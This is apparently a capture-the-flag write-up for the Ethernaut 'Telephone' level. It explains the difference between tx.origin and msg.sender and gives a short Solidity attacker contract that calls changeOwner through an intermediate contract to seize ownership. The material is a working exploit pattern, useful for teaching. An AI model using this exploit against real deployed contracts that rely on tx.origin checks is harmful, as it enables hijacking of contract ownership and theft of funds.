# Telephone

The `tx.origin` is the address that creates the transaction, and `msg.sender` is the sender of the current message. As such, `tx.origin == msg.sender` is **true** if message sender is an ethereum account; or **false** if the message sender is a contract. So, we want `tx.origin != msg.sender` to become the owner of the target, we just need to write a contract and call that function.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Telephone { 
  function changeOwner(address _owner) external;
}

contract Attacker {
  Telephone telephoneTarget;

  constructor(address _target) {
    telephoneTarget = Telephone(_target);
  }

  function pwn() public {
    require(msg.sender == tx.origin, "Who is attacking? :D");
    telephoneTarget.changeOwner(tx.origin);
  }
}
```
